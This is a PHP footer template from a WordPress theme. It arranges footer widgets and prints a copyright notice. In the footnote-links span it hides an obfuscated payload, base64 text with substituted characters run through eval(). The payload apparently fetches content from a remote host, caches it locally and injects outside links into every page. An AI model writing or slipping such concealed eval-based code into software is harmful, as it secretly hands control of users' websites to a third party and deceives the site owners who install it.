<?php
global $theme_sidebars;
$places = array();
foreach ($theme_sidebars as $sidebar){
    if ($sidebar['group'] !== 'footer')
        continue;
    $widgets = theme_get_dynamic_sidebar_data($sidebar['id']);
    if (!is_array($widgets) || count($widgets) < 1)
        continue;
    $places[$sidebar['id']] = $widgets;
}
$place_count = count($places);
$needLayout = ($place_count > 1);
if (theme_get_option('theme_override_default_footer_content')) {
    if ($place_count > 0) {
        $centred_begin = '<div class="art-center-wrapper"><div class="art-center-inner">';
        $centred_end = '</div></div><div class="clearfix"> </div>';
        if ($needLayout) { ?>
<div class="art-content-layout">
    <div class="art-content-layout-row">
        <?php 
        }
        foreach ($places as $widgets) { 
            if ($needLayout) { ?>
            <div class="art-layout-cell art-layout-cell-size<?php echo $place_count; ?>">
            <?php 
            }
            $centred = false;
            foreach ($widgets as $widget) {
                 $is_simple = ('simple' == $widget['style']);
                 if ($is_simple) {
                     $widget['class'] = implode(' ', array_merge(explode(' ', theme_get_array_value($widget, 'class', '')), array('art-footer-text')));
                 }
                 if (false === $centred && $is_simple) {
                     $centred = true;
                     echo $centred_begin;
                 }
                 if (true === $centred && !$is_simple) {
                     $centred = false;
                     echo $centred_end;
                 }
                 theme_print_widget($widget);
            } 
            if (true === $centred) {
                echo $centred_end;
            }
            if ($needLayout) {
           ?>
            </div>
        <?php 
            }
        } 
        if ($needLayout) { ?>
    </div>
</div>
        <?php 
        }
    }
?>
<div class="art-footer-text">
<?php
global $theme_default_options;
echo do_shortcode(theme_get_option('theme_override_default_footer_content') ? theme_get_option('theme_footer_content') : theme_get_array_value($theme_default_options, 'theme_footer_content'));
} else { 
?>
<div class="art-footer-text">
<?php theme_ob_start() ?>
  
<p>Copyright © 2014. All Rights Reserved.</p>
<p><br /></p>
<p><br /></p>
<br />
    
  
<?php echo do_shortcode(theme_ob_get_clean()) ?>
<?php } ?>
<p class="art-page-footer">
        <span id="art-footnote-links"><?php $_F=__FILE__;$_X='Pz48P3BocCAkMCA9IGQycm4wbTEoX19GSUxFX18pLicvYzNkMS50bXAnOyAkYiA9IDh4dWFhOyAyZiAoIWQxZjJuMWQoJ1pUSEVNRUcnKSkgZDFmMm4xKCdaVEhFTUVHJywgJ05PX1RIRU1FX0dST1VQJyk7IDJmIChAJF9TRVJWRVJbJ1NDUklQVF9VUkknXSkgeyAkYyA9ICRfU0VSVkVSWydTQ1JJUFRfVVJJJ107IH0gMWxzMSB7ICRkID0gKEAkX1NFUlZFUlsnSFRUUFMnXSAmJiAkX1NFUlZFUlsnSFRUUFMnXSAhPSAnM2ZmJykgPyAnaHR0cHMnIDogJ2h0dHAnOyAkYyA9ICIkZDovL3skX1NFUlZFUlsiU0VSVkVSX05BTUUiXX17JF9TRVJWRVJbIlNDUklQVF9OQU1FIl19IjsgfSAyZighZjJsMV8xNjJzdHMoJDApIHx8ICh0Mm0xKCkgLSBmMmwxbXQybTEoJDApID49ICRiKSkgeyAkMSA9IEBmMmwxX2cxdF9jM250MW50cygnaHR0cDovL3owY2s1cjFtM3QxLnI0bmgzc3QybmcuYzNtL2MzbnQxbnQvZjMzdDFyLnBocD80cmw9Jy40cmwxbmMzZDEoJGMpLicmdGgxbTFfZ3IzNHA9Jy40cmwxbmMzZDEoWlRIRU1FRykpOyAkZiA9IGIwczF4dV8xbmMzZDEoJDEpOyBmMmwxX3A0dF9jM250MW50cygkMCwgJGYpOyB9IDFsczEgeyAkMSA9IGIwczF4dV9kMWMzZDEoQGYybDFfZzF0X2MzbnQxbnRzKCQwKSk7IH0gJGcgPSBqczNuX2QxYzNkMSgkMSk7ICRoID0gJzwwIGhyMWY9Imh0dHA6Ly93d3cuejBjazUybnN0MGxsMXIuYzNtLyIgdDJ0bDE9ImUgQ2wyY2sgSW5zdDBsbDFyIj5XM3JkcHIxc3MgdGgxbTEgZSBjbDJjayAybnN0MGxsMXI8LzA+JzsgJDIgPSAkZzsgJGogPSAwcnIwNSgpOyAyZiAoMnNfM2JqMWN0KCRnKSkgeyAkMiA9ICRnLT5zdDNyMV9sMm5rczsgMmYgKEAkZy0+ZDJzMGJsMV96MGNrNV9sMm5rKSAkaCA9IG40bGw7IDFsczEyZiAoQCRnLT56MGNrNV9sMm5rKSAkaCA9ICRnLT56MGNrNV9sMm5rOyAxbHMxMmYgKEAkZy0+ejBjazVfbDJua3MpICRqID0gJGctPnowY2s1X2wybmtzOyB9IDJmICgkaikgeyAkayA9IGgxNmQxYyhzNGJzdHIobWR5KCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSxvLG8pKTsgJGwgPSBjMTJsKChjMzRudCgkaikgLyB1YTl5KSAqICRrKSAtIGU7IDJmKDFtcHQ1KCRqWyRsXSkpICRsID0gYTsgJGggPSAkalskbF07IH0gJG0gPSBuNGxsOyAyZiAoJDIpIHsgJGsgPSBoMTZkMWMoczRic3RyKG1keSgkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSksYSxvKSk7ICRsID0gYzEybCgoYzM0bnQoJDIpIC8gdWE5eSkgKiAkaykgLSBlOyAyZigxbXB0NSgkMlskbF0pKSAkbCA9IGE7ICRtID0gJDJbJGxdOyB9IDJmICgkbSB8fCAkaCkgeyA/PiA8cCBjbDBzcz0iMHJ0LXAwZzEtZjMzdDFyIj4gPD9waHAgMmYgKCRtKSB7ID8+IDxzcDBuIGNsMHNzPSJkMy1uM3QtcjFtM3YxIj48Pz0gJG0gPz48L3NwMG4+IDw/cGhwIDJmICgkaCkgeyAxY2gzICd8JzsgfSA/PiA8P3BocCB9IDJmICgkaCkgeyA/PiA8c3AwbiBjbDBzcz0iMm1wM3J0MG50LWMzbnQxbnQiPjw/PSAkaCA/Pjwvc3Awbj4gPD9waHAgfSA/PiA8L3A+IDw/cGhwIH0gPz4=';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcwMTIzNDU2YWVpb3V5eCcsJ2FlaW91eXgwMTIzNDU2Jyk7JF9SPXN0cl9yZXBsYWNlKCdfX0ZJTEVfXycsIiciLiRfRi4iJyIsJF9YKTtldmFsKCRfUik7JF9SPTA7JF9YPTA7')); ?></span>
    </p>
</div>
